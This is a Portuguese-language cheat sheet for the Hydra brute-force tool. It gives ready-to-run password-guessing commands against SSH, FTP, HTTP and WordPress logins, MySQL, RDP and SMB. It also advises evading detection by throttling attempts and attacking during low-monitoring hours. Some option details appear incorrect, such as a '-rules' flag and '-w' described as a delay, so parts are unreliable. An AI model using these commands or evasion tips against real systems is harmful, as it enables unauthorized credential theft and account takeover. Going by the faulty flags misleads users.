## O que é o Hydra?
O **Hydra** é uma ferramenta de brute-force de rede que suporta múltiplos protocolos e serviços. É amplamente utilizado em testes de penetração para verificar a força de senhas.

## Sintaxe Básica

```bash
hydra -l <usuário> -p <senha> <protocolo://servidor:porta> <opções>
hydra -L <lista_usuários> -P <lista_senhas> <alvo> <opções>
```

## Opções Principais

### Opções de Autenticação
| Opção | Descrição |
|-------|-----------|
| `-l` | Usuário único |
| `-L` | Arquivo com lista de usuários |
| `-p` | Senha única |
| `-P` | Arquivo com lista de senhas |
| `-e` | Opções especiais: `n` (null), `s` (login como senha), `r` (senha como login) |
| `-u` | Tentar usuário primeiro (padrão: senha primeiro) |
| `-f` | Parar após encontrar primeira credencial válida |

### Opções de Conexão
| Opção | Descrição |
|-------|-----------|
| `-s` | Porta personalizada |
| `-S` | Usar conexão SSL |
| `-t` | Número de tarefas paralelas (padrão: 16) |
| `-w` | Timeout em segundos (padrão: 32) |
| `-4` | Usar apenas IPv4 |
| `-6` | Usar apenas IPv6 |

### Opções de Saída
| Opção | Descrição |
|-------|-----------|
| `-o` | Arquivo de saída |
| `-b` | Formato de saída: `text`, `json`, `jsonv1` |
| `-v` | Modo verboso |
| `-V` | Modo verboso detalhado |

## Exemplos por Protocolo

### SSH
```bash
# Ataque básico
hydra -l admin -P passwords.txt ssh://192.168.1.1

# Com lista de usuários
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# Porta personalizada
hydra -L users.txt -P passwords.txt ssh://192.168.1.1 -s 2222

# Limitar tarefas paralelas
hydra -L users.txt -P passwords.txt ssh://192.168.1.1 -t 4
```

### FTP
```bash
# Ataque FTP básico
hydra -L users.txt -P passwords.txt ftp://192.168.1.1

# FTP com SSL
hydra -L users.txt -P passwords.txt ftps://192.168.1.1

# Modo verboso
hydra -v -L users.txt -P passwords.txt ftp://192.168.1.1
```

### HTTP/HTTPS
```bash
# Formulário POST básico
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Com cabeçalhos personalizados
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=error" -H "User-Agent: Mozilla/5.0"

# HTTPS
hydra -l admin -P passwords.txt 192.168.1.1 https-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

### WordPress
```bash
# Ataque específico para WordPress
hydra -L users.txt -P passwords.txt 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

### MySQL
```bash
# Ataque ao MySQL
hydra -L users.txt -P passwords.txt mysql://192.168.1.1

# Porta personalizada
hydra -L users.txt -P passwords.txt mysql://192.168.1.1:3307
```

### RDP (Remote Desktop)
```bash
# Ataque RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.1

# Com domínio
hydra -L users.txt -P passwords.txt rdp://192.168.1.1 -m "DOMAIN=meudominio"
```

### SMB
```bash
# Ataque SMB
hydra -L users.txt -P passwords.txt smb://192.168.1.1

# Com grupo de trabalho
hydra -L users.txt -P passwords.txt smb://192.168.1.1 -m "WORKGROUP=WORKGROUP"
```

## Técnicas Avançadas

### Ataques com Regras
```bash
# Usando regras do John the Ripper para gerar senhas
hydra -l admin -P /usr/share/john/password.lst -rules ssh://192.168.1.1
```

### Ataque com Serviços Múltiplos
```bash
# Testar múltiplos serviços
hydra -L users.txt -P passwords.txt -M services.txt
```

Onde `services.txt` contém:
```
ssh://192.168.1.1
ftp://192.168.1.1
http://192.168.1.1
```

### Modo de Restauração
```bash
# Continuar sessão interrompida
hydra -R hydra.restore
```

### Ataque com Delay
```bash
# Adicionar delay entre tentativas
hydra -L users.txt -P passwords.txt ssh://192.168.1.1 -w 10 -t 1
```

## Boas Práticas

### 1. Performance
- Ajuste `-t` conforme a capacidade do servidor alvo
- Use `-w` para evitar timeouts em redes lentas
- Teste com poucas credenciais primeiro

### 2. Evitar Detecção
- Use delays entre tentativas (`-W`)
- Limite o número de threads (`-t`)
- Considere horários de menor monitoramento

### 3. Listas Eficientes
- Comece com listas de senhas comuns
- Use informações de OSINT para criar listas personalizadas
- Combine com regras de mutação

### 4. Monitoramento
- Use modo verboso para debug (`-v` ou `-V`)
- Salve resultados com `-o`
- Use formato JSON para processamento posterior

## Exemplo de Uso Completo

```bash
# Ataque completo com todas as opções
hydra -L users.txt -P passwords.txt \
  -e nsr \
  -t 4 \
  -w 10 \
  -f \
  -o results.txt \
  -b json \
  -v \
  ssh://192.168.1.1:22
```

Este comando:
- Usa listas de usuários e senhas
- Testa senhas nulas, iguais ao usuário e reversas
- Limita a 4 tarefas paralelas
- Timeout de 10 segundos
- Para na primeira credencial válida
- Salva em JSON
- Modo verboso
